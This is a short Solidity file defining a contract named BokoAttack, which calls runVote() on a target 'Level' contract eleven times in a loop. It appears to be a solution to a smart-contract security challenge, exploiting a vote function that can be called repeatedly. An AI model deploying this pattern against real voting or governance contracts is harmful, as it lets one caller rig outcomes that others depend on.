// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Level {
    function runVote() external;
}

contract BokoAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function vote() public returns (uint) {
        for(int i = 0; i < 11; i++)
        {
            Level(target).runVote();
        }

        return 1;
    }
}
